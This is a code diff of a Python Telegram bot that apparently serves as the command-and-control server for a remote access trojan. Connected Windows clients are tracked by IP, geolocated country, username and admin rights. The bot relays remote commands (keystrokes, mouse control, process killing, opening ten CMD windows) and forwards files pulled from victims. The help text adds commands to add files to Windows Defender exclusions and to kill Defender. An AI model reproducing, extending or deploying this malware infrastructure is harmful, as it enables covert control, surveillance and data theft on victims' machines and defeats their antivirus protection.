@@ -3,6 +3,7 @@ import json
 import logging
 import tempfile
 import time
+import aiohttp
 import os
 from datetime import datetime
 import io
@@ -65,6 +66,12 @@ def is_valid_filename(filename):
     invalid = '<>:"/\\|?*'
     return filename and all(c not in invalid for c in filename) and filename.strip() not in ['.', '..']
 
+async def read_json(reader):
+    """Читает одну JSON-команду (только строку до \n)."""
+    line = await reader.readline()
+    if not line:
+        return None
+    return json.loads(line.decode('utf-8'))
 
 async def find_client_by_thread(thread_id):
     # Преобразование ID в int для корректного сравнения (Telegram ID всегда int)
@@ -157,27 +164,23 @@ async def send_client_command(message: Message, command: str):
     except Exception as e:
         await message.reply(f"❌ Ошибка отправки: {e}")
 
-
-@dp.message(Command("playsound"), IsInGroup())
-async def playsound_handler(message: Message, command: CommandObject):
-    """Обработчик команды /playsound."""
-    # command.args содержит все, что идет после /playsound
-    user_path = command.args.strip() if command.args else ""
-    
-    if not user_path:
-        await message.reply("Использование: /playsound <путь_к_файлу>")
-        return
-    
-    # Отправляем полную команду клиенту
-    full_command = f"/playsound {user_path}"
-    await send_client_command(message, full_command)
-
-
-@dp.message(Command("stopsound"), IsInGroup())
-async def stopsound_handler(message: Message):
-    """Обработчик команды /stopsound."""
-    await send_client_command(message, "/stopsound")
-    
+async def get_flag_and_country(ip):
+    if ip in ["127.0.0.1", "localhost", "0.0.0.0"] or ip.startswith("192.168."):
+        return "🏠", "Local"
+    try:
+        async with aiohttp.ClientSession() as session:
+            # Используем бесплатный API (ip-api.com)
+            async with session.get(f'http://ip-api.com/json/{ip}?fields=countryCode', timeout=3) as resp:
+                data = await resp.json()
+                cc = data.get("countryCode", "XX").upper()
+                
+                # Магия превращения кода страны (US, RU) в эмодзи флага
+                offset = 127397
+                flag = "".join([chr(ord(c) + offset) for c in cc])
+                return flag, cc
+    except:
+        return "🏳️", "??"
+        
 async def handle_client(reader, writer):
     global CLIENT_HISTORY_CACHE # 🔥 Используем глобальный кэш
     
@@ -200,6 +203,12 @@ async def handle_client(reader, writer):
             return
         handshake = json.loads(line.rstrip(b'\n').decode('utf-8'))
         client_id = handshake.get("client_id", "").strip()
+
+        client_ip = addr[0]
+        # Используем данные из хендшейка как исходные (или {} если их нет)
+        client_info = handshake.get("info", {}) 
+        thread_id = None
+
         if not client_id or len(client_id) < 5:
             return
         logger.info(f"Клиент {client_id} подключен {addr}")
@@ -223,6 +232,8 @@ async def handle_client(reader, writer):
             # 🔥 Используем только CLIENT_HISTORY_CACHE
             if client_id in CLIENT_HISTORY_CACHE:
                 thread_id = CLIENT_HISTORY_CACHE[client_id]['thread_id']
+                client_info = CLIENT_HISTORY_CACHE[client_id].get('info', client_info)
+                client_ip = CLIENT_HISTORY_CACHE[client_id].get('ip', client_ip)
 
             if client_id in clients:
                 # Клиент переподключился: используем существующий thread_id и обновляем данные
@@ -244,8 +255,24 @@ async def handle_client(reader, writer):
                 # Новый клиент: создаем топик, если thread_id не найден
                 if not thread_id:
                     try:
-                        topic = await bot.create_forum_topic(GROUP_CHAT_ID, name=f"Клиент {client_id}")
+                        # === ГЕНЕРАЦИЯ ИМЕНИ ===
+                        client_ip = addr[0]
+                        flag, _ = await get_flag_and_country(client_ip)
+                        
+                        os_name = client_info.get("os", "Win")
+                        user = client_info.get("user", "User")
+                        is_admin = client_info.get("is_admin", False)
+                        
+                        admin_icon = "⚡" if is_admin else "👤"
+                        
+                        # Формируем строку: 🇺🇸 Win 10 | ⚡ Admin | 88.21.33.12
+                        # Обрезаем имя юзера, если оно слишком длинное
+                        topic_name = f"{flag} {os_name} | {admin_icon} {user[:10]} | {client_ip}"
+                        
+                        # Создаем топик с КРАСИВЫМ именем
+                        topic = await bot.create_forum_topic(GROUP_CHAT_ID, name=topic_name)
                         thread_id = topic.message_thread_id
+                        # ==================================
                     except Exception as e:
                         logger.error(f"Топик ошибка: {e}")
                         thread_id = None
@@ -264,6 +291,8 @@ async def handle_client(reader, writer):
                     "thread_id": thread_id,
                     "last_offline": None, # Онлайн
                     "first_seen": first_seen_date, # NEW: Используем определенную выше дату
+                    'info': client_info, # <--- ТЕПЕРЬ ХРАНИМ!
+                    'ip': client_ip      # <--- ТЕПЕРЬ ХРАНИМ!
                 }
                 await save_client_history(CLIENT_HISTORY_CACHE)
                 
@@ -282,7 +311,20 @@ async def handle_client(reader, writer):
                     
                     try:
                         # 💥 ПОВТОРНАЯ ПОПЫТКА СОЗДАНИЯ ТОПИКА
-                        topic = await bot.create_forum_topic(GROUP_CHAT_ID, name=f"Клиент {client_id}")
+                        
+                        # client_ip и client_info теперь доступны и инициализированы!
+                        flag, _ = await get_flag_and_country(client_ip) 
+                        
+                        os_name = client_info.get("os", "Win") 
+                        user = client_info.get("user", "User")
+                        is_admin = client_info.get("is_admin", False)
+                        
+                        admin_icon = "⚡" if is_admin else "👤"
+                        # Используем переменные, определенные в начале функции
+                        topic_name = f"{flag} {os_name} | {admin_icon} {user[:10]} | {client_ip}"
+                        
+                        # Создаем топик
+                        topic = await bot.create_forum_topic(GROUP_CHAT_ID, name=topic_name)
                         new_thread_id = topic.message_thread_id
                         
                         # ОБЯЗАТЕЛЬНО ОБНОВЛЯЕМ КЭШ и список активных клиентов
@@ -314,6 +356,10 @@ async def handle_client(reader, writer):
             try:
                 # 🔥 HEARTBEAT: Таймаут чтения 20 секунд
                 line = await asyncio.wait_for(reader.readline(), timeout=20)
+                if b'\x00' in line or any(b > 0xF4 for b in line):
+                    # это бинарь → игнорируем до конца строки
+                    continue
+
             except asyncio.TimeoutError:
                 logger.warning(f"Таймаут чтения от {client_id}. Разрыв соединения.")
                 break # Выход из цикла, триггер finally
@@ -322,8 +368,15 @@ async def handle_client(reader, writer):
             
             if not line.endswith(b'\n'):
                 break
+        
             line = line.rstrip(b'\n')
             if not line:
+                continue
+
+            clean = line.strip()    
+
+            if not line.startswith(b'{'):
+                logger.warning(f"Пропущена бинарная/мусорная строка от {client_id}")
                 continue
                 
             try:
@@ -340,39 +393,54 @@ async def handle_client(reader, writer):
                 # 🔥 БЛОК 1: ОБРАБОТКА ФАЙЛОВОГО ОТВЕТА ДЛЯ /tasklist и /execute
                 if command_name == "/response_file":
                     file_name = res.get("file_name", "output.txt")
-                    
-                    # 1. Получаем размер файла
-                    size_data = await reader.readuntil(b'\n')
-                    file_size = int(size_data.strip())
-                    
-                    # 2. Читаем тело файла
+                    file_size = int(res.get("file_size", 0))
+                
+                    if file_size <= 0 or file_size > 200 * 1024 * 1024:
+                        logger.error(f"Некорректный размер файла: {file_size}")
+                        continue
+                
+                    # Читаем бинарные данные строго по file_size
                     file_data = await reader.readexactly(file_size)
-                    
-                    # 3. Сохраняем на Сервере
-                    with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix=f"_{file_name}") as tmp_file:
-                        tmp_file.write(file_data)
-                        temp_file_path = tmp_file.name
-                        
-                    # 4. Отправляем файл в Telegram
+                
+                    # Сохраняем
+                    with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix=f"_{file_name}") as tmp:
+                        tmp.write(file_data)
+                        temp_file_path = tmp.name
+                
+                    # Отправляем в Telegram
                     tg_file = FSInputFile(temp_file_path, filename=file_name)
-                    caption_text = res.get("result", f"✅ Вывод команды *{file_name}*:")
-                    
+                    caption = res.get("result", f"Файл {file_name}")
+                
                     await bot.send_document(
-                        chat_id=GROUP_CHAT_ID, 
-                        document=tg_file, 
-                        caption=caption_text, 
+                        chat_id=GROUP_CHAT_ID,
+                        document=tg_file,
+                        caption=caption,
                         message_thread_id=thread_id,
                         parse_mode='Markdown'
                     )
-                    
-                    # 5. Очистка
+                
                     os.remove(temp_file_path)
                     continue
+
                 
                 # --------------------------------------------------------------------------------------
                 # БЛОК 2(Обработка простого текстового результата)
                 if "result" in res:
-                    await bot.send_message(GROUP_CHAT_ID, res["result"], message_thread_id=thread_id)
+                    text_from_client = res["result"]
+                    
+                    try:
+                        # ✅ ИСПРАВЛЕНО: Добавлен parse_mode='Markdown'
+                        await bot.send_message(
+                            GROUP_CHAT_ID, 
+                            text_from_client, 
+                            message_thread_id=thread_id, 
+                            parse_mode='Markdown' 
+                        )
+                    except Exception as e:
+                        # Если Markdown сломался, отправляем как обычный текст
+                        logger.warning(f"Ошибка парсинга Markdown ({client_id}): {e}. Отправка в Plain Text.")
+                        await bot.send_message(GROUP_CHAT_ID, text_from_client, message_thread_id=thread_id)
+                        
                     continue
                     
                 # БЛОК 3: СТАРЫЙ КОД (Обработка других файлов, инициированных Клиентом, например, скриншотов)
@@ -516,6 +584,8 @@ async def handle_help(message: Message):
 <code>/taskkill &lt;имя.exe или PID&gt;</code> — завершить процесс
 <code>/restart</code>(нестабильно) — перезапустить клиента
 <code>/cmdbomb</code> — открыть 10 окон CMD
+<code>/wd_exclude [путь]</code> — добавить исходный/указанный файл в исключение Win.Def 
+<code>/killwindef</code> — временно убить Win.Def
 
 <b>💬 Интерфейс и уведомления</b>
 <code>/msg [тип] [заголовок]/t&lt;текст&gt;</code> — показать окно на клиенте
@@ -529,12 +599,14 @@ async def handle_help(message: Message):
 <code>/maximize</code> — развернуть активное окно
 <code>/altf4</code> — закрыть активное окно
 <code>/keypress &lt;клавиши&gt;</code> — нажать комбинацию (например: <code>alt f4</code>, <code>win r</code>)
+<code>/holdkey &lt;сек&gt; &lt;клавиши&gt;</code> — зажать клавишу/клавиши на N секунд
 <code>/mouseclick</code> — клик мышью
 <code>/mousemove &lt;X&gt; &lt;Y&gt;</code> — переместить курсор
 <code>/keytype &lt;текст&gt;</code> — ввести текст (с поддержкой кириллицы)
 <code>/open_image &lt;сек&gt; &lt;путь&gt;</code> — открыть картинку на полный экран на N секунд
 <code>/applist [&lt;индекс&gt;]</code> — посмотреть список окон или вывести одно из них "вперед".
 <code>/applist_close &lt;индекс&gt;</code> — закрыть выбранное окно.
+<code>/applist_title &lt;индекс&gt; &lt;новое имя&gt;</code> — Переименовать выбранное окно
 
 <b>👾 Автоматизация</b>
 <code>/mousemesstart</code> — включить случайное движение мыши
@@ -560,7 +632,7 @@ async def handle_help(message: Message):
 <code>/clients</code> - посмотреть активных клиентов и их историю
 <code>/version</code> - посмотреть версию ПО на стороне клиента
 
-    <i>ver beta v20</i>"""
+    <i>ver beta v28</i>"""
     await message.reply(help_text, parse_mode="HTML")
 
 async def get_client_status(client_id):
@@ -568,29 +640,29 @@ async def get_client_status(client_id):
     global CLIENT_HISTORY_CACHE
     
     first_seen_str = ""
-    
-    # 🔥 NEW: Извлекаем и форматируем first_seen из кэша
+    # Извлекаем и форматируем first_seen из кэша
     if client_id in CLIENT_HISTORY_CACHE:
         first_seen = CLIENT_HISTORY_CACHE[client_id].get('first_seen')
-        if first_seen and isinstance(first_seen, datetime):
-            first_seen_str = f"\n*Первое: {first_seen.strftime('%Y-%m-%d %H:%M:%S')}*" # Форматируем
-        elif first_seen and isinstance(first_seen, str):
-             # На случай, если конвертация в load_client_history не сработала по какой-то причине
-             try:
-                 first_seen_str = f"\n*Первое: {datetime.fromisoformat(first_seen).strftime('%Y-%m-%d %H:%M:%S')}*"
-             except ValueError:
-                 pass
-                 
-
+        if first_seen:
+            # Преобразуем, если строка, иначе форматируем
+            if isinstance(first_seen, str):
+                try:
+                    first_seen = datetime.fromisoformat(first_seen)
+                except ValueError:
+                    first_seen = None
+            
+            if isinstance(first_seen, datetime):
+                # 🔥 ИЗМЕНЕН ФОРМАТ ДАТЫ ПЕРВОГО ПОДКЛЮЧЕНИЯ
+                first_seen_str = f" (С: {first_seen.strftime('%d.%m.%Y')})" 
+        
     async with clients_lock:
         # 1. Проверяем активных клиентов
         if client_id in clients and clients[client_id].get('writer'):
+            # 🔥 ИЗМЕНЕН ФОРМАТ ВРЕМЕНИ ПОСЛЕДНЕГО ВИЗИТА: только время
             last_seen_time = clients[client_id]['last_seen'].strftime("%H:%M:%S")
-            # --- NEW LINE ---
-            return f"🟢 {last_seen_time}{first_seen_str}" # Добавляем first_seen_str
-            # ----------------
+            return f"🟢 *Онлайн* (Видел: {last_seen_time}){first_seen_str}" 
             
-        # 2. Проверяем историю
+        # 2. Проверяем историю (Оффлайн)
         if client_id in CLIENT_HISTORY_CACHE:
             last_offline = CLIENT_HISTORY_CACHE[client_id].get('last_offline')
             if last_offline:
@@ -599,37 +671,82 @@ async def get_client_status(client_id):
                         last_offline = datetime.fromisoformat(last_offline)
                         CLIENT_HISTORY_CACHE[client_id]['last_offline'] = last_offline
                     except ValueError:
-                        logger.error(f"История: Неверный формат даты для {client_id}: {last_offline}")
-                        return f"⚫ Оффлайн (был: Ошибка даты){first_seen_str}"
+                        # Если ошибка, выводим более короткое сообщение об ошибке
+                        return f"⚫ Оффлайн (Дата ошибки){first_seen_str}"
+
+                # 🔥 ИЗМЕНЕН ФОРМАТ ВРЕМЕНИ ПОСЛЕДНЕГО ВИЗИТА: дата и время
+                offline_time = last_offline.strftime("%d.%m %H:%M") 
+                return f"⚫ *Оффлайн* (Был: {offline_time}){first_seen_str}" 
                 
-                offline_time = last_offline.strftime("%Y-%m-%d %H:%M:%S")
-                # --- NEW LINE ---
-                return f"⚫ Оффлайн (был: {offline_time}){first_seen_str}" # Добавляем first_seen_str
-                # ----------------
-                
-        return "❓ Неизвестно"
+        return f"❓ *Неизвестно*{first_seen_str}"
 
 
 @dp.message(Command('clients'), IsInGroup())
 async def handle_clients(message: Message):
-    global CLIENT_HISTORY_CACHE
-    
-    if not CLIENT_HISTORY_CACHE:
-        await message.reply("Нет зарегистрированных клиентов в истории.")
+    global CLIENT_HISTORY_CACHE, GROUP_CHAT_ID 
+
+    async with clients_lock:
+        active_ids = list(clients.keys())
+
+    if not active_ids:
+        await message.reply("Нет активных клиентов.")
         return
 
-    response = ["*Клиенты (Онлайн / История):*"]
-    
-    sorted_client_ids = sorted(CLIENT_HISTORY_CACHE.keys())
-    
-    for client_id in sorted_client_ids:
-        # Убедимся, что у нас есть thread_id, прежде чем формировать ссылку
-        thread_id = CLIENT_HISTORY_CACHE[client_id].get('thread_id', message.message_thread_id) 
-        status = await get_client_status(client_id)
-        
-        # Формируем ссылку на топик
-        response.append(f"[{client_id}](tg://message?message_thread_id={thread_id}) | {status}")
-        
+    try:
+        chat_id_for_url = str(GROUP_CHAT_ID)[4:]
+    except:
+        chat_id_for_url = "ERROR_CHAT_ID"
+
+    response = ["*Список клиентов (Только онлайн):*\n"]
+
+    for client_id in sorted(active_ids):
+        thread_id = CLIENT_HISTORY_CACHE.get(client_id, {}).get('thread_id', 0)
+        status_line = await get_client_status(client_id)
+
+        client_url = f"https://t.me/c/{chat_id_for_url}/{thread_id}"
+        client_link = f"*{client_id}* ([→]({client_url}))"
+
+        response.append(f"{client_link}\n{status_line}")
+        response.append("-" * 30)
+
+    if response[-1].startswith("-"):
+        response.pop()
+
+    await message.reply('\n'.join(response), parse_mode='Markdown')
+
+@dp.message(Command('clients_off'), IsInGroup())
+async def handle_clients_off(message: Message):
+    global CLIENT_HISTORY_CACHE, clients, GROUP_CHAT_ID
+
+    async with clients_lock:
+        active_ids = set(clients.keys())
+
+    offline_ids = [cid for cid in CLIENT_HISTORY_CACHE if cid not in active_ids]
+
+    if not offline_ids:
+        await message.reply("Нет оффлайн клиентов.")
+        return
+
+    try:
+        chat_id_for_url = str(GROUP_CHAT_ID)[4:]
+    except:
+        chat_id_for_url = "ERROR_CHAT_ID"
+
+    response = ["*Список клиентов (Оффлайн):*\n"]
+
+    for client_id in sorted(offline_ids):
+        thread_id = CLIENT_HISTORY_CACHE.get(client_id, {}).get('thread_id', 0)
+        status_line = await get_client_status(client_id)
+
+        client_url = f"https://t.me/c/{chat_id_for_url}/{thread_id}"
+        client_link = f"*{client_id}* ([→]({client_url}))"
+
+        response.append(f"{client_link}\n{status_line}")
+        response.append("-" * 30)
+
+    if response[-1].startswith("-"):
+        response.pop()
+
     await message.reply('\n'.join(response), parse_mode='Markdown')
 
 
@@ -671,7 +788,6 @@ async def handle_msg(message: Message, command: CommandObject):
         await writer.drain()
         await message.reply("✅ Отправлено")
     except Exception as e:
-    # 🔥 ИСПРАВЛЕНИЕ: Если отправка не удалась (например, ConnectionResetError или BrokenPipeError)
     
     # 1. Помечаем клиента для удаления
         async with clients_lock:
@@ -703,9 +819,9 @@ async def handle_msg(message: Message, command: CommandObject):
     
         # Очищаем нерабочий writer
         if writer:
-            writer.close()
-            
+            writer.close()       
         return
+
 @dp.message(Command(commands=["upload"]), IsInGroup())
 async def handle_upload_command(message: Message, command: CommandObject):
     thread_id = message.message_thread_id
@@ -846,7 +962,7 @@ async def handle_generic_command(message: Message):
         await message.reply("❌ Для загрузки файла (upload) отправьте сам файл в этот чат, не команду.")
         return
         
-    # 2. Обработка упоминания бота (Оставьте ваш код, он корректен)
+    # 2. Обработка упоминания бота
     if '@' in cmd_part:
         # Ваш код здесь
         cmd, botname = cmd_part.split('@', 1)
@@ -854,8 +970,7 @@ async def handle_generic_command(message: Message):
             return
         text = cmd + text[len(cmd_part):] # Очищаем команду
         
-    # 3. ПОИСК КЛИЕНТА (Здесь возникает ошибка KeyError: 0)
-    # Эта строка вызывает ошибку, если в clients лежит словарь вместо кортежа.
+    # 3. ПОИСК КЛИЕНТА
     _, _, writer = await find_client_by_thread(thread_id)
     
     if not writer:
